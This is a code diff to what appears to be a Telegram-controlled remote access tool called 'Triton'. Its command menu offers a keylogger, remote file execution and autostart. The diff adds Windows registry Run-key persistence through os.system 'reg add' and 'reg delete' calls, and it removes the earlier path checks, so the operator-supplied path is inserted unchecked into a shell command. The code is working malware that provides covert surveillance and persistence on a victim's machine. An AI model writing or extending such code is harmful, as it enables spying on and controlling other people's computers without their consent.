@@ -34,6 +34,7 @@ textovik = """
 - ⚙️ **/start** - Start the program
 - ⚙️ **/help** - Help with commands
 - 🔌 **/addstartup** - Add autostart
+- 🔌 **/deletestartup** - Delete file from autostart
 - ⌨️ **/keylogger** - Start keylogger
 - ⛔ **/stopkeylogger** - Stop keylogger
 - 👟 **/run [filepath]** - Run file
@@ -76,7 +77,6 @@ textovik = """
 - 🔊 **/fullvolume** - Set volume to full
 - 🔉 **/volumeplus** - Increase volume by 10
 - 🔇 **/volumeminus** - Decrease volume by 10
-- 🔄️ **/rotate** - Rotate monitor +90 degrees
 - 🪟 **/maximize** - Maximize active window
 - 🪟 **/minimize** - Minimize active window
 
@@ -169,6 +169,24 @@ def checkpass(message):
 
         else:
             bot.send_message(message.chat.id, 'password is wrong')
+    
+#################################################################################            
+@bot.message_handler(commands=['deletestartup'])
+def delete_startup(message):
+    try:
+        key_name = "Triton"
+
+    
+        command = f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /f'
+        result = os.system(command)
+        if result == 0:
+            bot.send_message(message.chat.id, "Removed from autostart successfully!")
+        else:
+            bot.send_message(message.chat.id, "ERROR")
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Error{e}')
+
+
 #################################################################################    
 user_state = {}
 
@@ -180,24 +198,20 @@ def add_startup(message):
 @bot.message_handler(func=lambda message: user_state.get(message.chat.id) == 'waiting_for_path')
 def handle_executable_path(message):
     executable_path = message.text
-    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
     
-    if not os.path.exists(executable_path):
-        bot.send_message(message.chat.id, 'The specified file does not exist. Please try again.')
-    elif not executable_path.lower().endswith('.exe'):
-        bot.send_message(message.chat.id, 'Please provide a valid .exe file path.')
+    
+
+    key_name = "Triton"
+
+    command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /t REG_SZ /d "{executable_path}" /f'
+
+    result = os.system(command)
+
+    if result == 0:
+        bot.send_message(message.chat.id, "Added to autostart successfully!")
     else:
-        if os.path.isdir(startup_folder):
-            executable_filename = os.path.basename(executable_path)
-            destination_path = os.path.join(startup_folder, executable_filename)
-            try:
-                shutil.copyfile(executable_path, destination_path)
-                bot.send_message(message.chat.id, f'{executable_filename} added to startup successfully!')
-            except Exception as e:
-                bot.send_message(message.chat.id, f'Failed to add to startup: {e}')
-        else:
-            bot.send_message(message.chat.id, 'Startup folder not found.')
-    
+        bot.send_message(message.chat.id, "ERROR")
+
     user_state.pop(message.chat.id, None)
 #################################################################################
 @bot.message_handler(commands=['mouseright'])
